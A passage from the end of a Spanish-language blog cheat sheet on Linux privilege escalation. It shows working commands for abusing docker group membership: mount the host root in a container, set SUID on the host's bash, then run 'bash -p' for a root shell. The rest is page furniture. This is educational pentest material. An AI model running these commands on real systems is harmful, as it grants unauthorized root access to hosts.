<span class="c"># De esta manera todos los cambios que se apliquen dentro del directorio </span>
<span class="c"># /mnt, del contenedor, ser√°n realizados en el servidor padre.</span>
<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> &lt;name&gt;:&lt;tag&gt; /bin/bash

<span class="c"># Container session:</span>
<span class="c"># Se le asignan privilegios SUID a la bash del servidor padre</span>
<span class="c"># montada en el contenedor.</span>
<span class="nv">$ </span><span class="nb">chmod </span>4755 /mnt/bin/bash
<span class="nv">$ </span><span class="nb">exit</span>

<span class="c"># Server session:</span>
<span class="c"># Una vez salimos del contenedor nuestra /bin/bash tendr√° privielgios</span>
<span class="c"># SUID, por lo que ser√° cuesti√≥n de ejecutar el siguiente comando para</span>
<span class="c"># escalar privilegios:</span>
<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
</pre></table></code></div></div><p>De manera alternativa puedes utilizar el <strong>GTFOBins</strong>: <a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></p><p>Si est√°s interesado en la tem√°tica de contenedores, puedes mirarte este post que escrib√≠ hace un tiempo sobre <a href="https://sha-16.github.io/posts/docker-como-ser-un-pro-siendo-noob/">Docker</a>.</p><hr /><p>Muchas gracias por haber le√≠do el post, espero que el contenido haya sido √∫til, cualquier cosa puedes contactarme por mis redes sociales! üí™</p><p>Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/linux/'>linux</a>, <a href='/categories/privesc/'>privesc</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/cheat-sheet/" class="post-tag no-text-decoration" >cheat-sheet</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://github.com/sha-16" data-toggle="tooltip" data-placement="top" title="github" target="_blank" rel="noopener" aria-label="github"> <i class="fa-fw fab fa-github"></i> </a> <a href="https://twitter.com/sha16_x" data-toggle="tooltip" data-placement="top" title="twitter" target="_blank" rel="noopener" aria-label="twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" data-toggle="tooltip" data-placement="top" title="youtube" target="_blank" rel="noopener" aria-label="youtube"> <i class="fa-fw fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" data-toggle="tooltip" data-placement="top" title="twitch" target="_blank" rel="noopener" aria-label="twitch"> <i class="fa-fw fab fa-twitch"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Resolute-HackTheBox-Machine/">Resolute - Write Up (HTB) ‚ù§</a><li><a href="/posts/Forest-HackTheBox-Machine/">Forest - Write Up (HTB) ‚ù§</a><li><a href="/posts/Sauna-HackTheBox-Machine/">Sauna - Write Up (HTB) ‚ù§</a><li><a href="/posts/Active-HackTheBox-Machine/">Active - Write Up (HTB) ‚ù§</a><li><a href="/posts/Blackfield-HackTheBox-Machine/">Blackfield - Write Up (HTB) ‚ù§</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64-bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/BatComputer-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 10<i class="unloaded">2023-09-10T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bat Computer - Pwn Challenge (HTB) ‚ù§</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. En esta ocasi√≥n, les traigo la resoluci√≥n de un BoF en un binario de 64-bit. El desaf√≠o como tal, consiste en un programa que te ...</p></div></div></a></div><div class="card"> <a href="/posts/Optimistic-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 17<i class="unloaded">2023-09-17T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Optimistic - Pwn Challenge (HTB) ‚ù§</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. En esta ocasi√≥n, les traigo la resoluci√≥n de un BoF en un binario de 64-bit. El desaf√≠o como tal, consiste en un programa que sim...</p></div></div></a></div><div class="card"> <a href="/posts/Reg-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 17<i class="unloaded">2023-09-17T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reg - Pwn Challenge (HTB) ‚ù§</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. Este es un reto de pwning, del tipo ret2win, el cual implica explotar un Buffer Overflow con el objetivo hacer una llamado a una ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/docker-como-ser-un-pro-siendo-noob/" class="btn btn-outline-primary" prompt="Older"><p>Docker - C√≥mo ser un pro siendo noob üí£</p></a> <a href="/posts/Jeeves-HackTheBox-Pwn/" class="btn btn-outline-primary" prompt="Newer"><p>Jeeves - Pwn Challenge (HTB) ‚ù§</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://github.com/sha-16">Diego Osorio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64 bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="diegoosorib" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. Feel free to invite me a coffee if you like my content ‚ù§" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
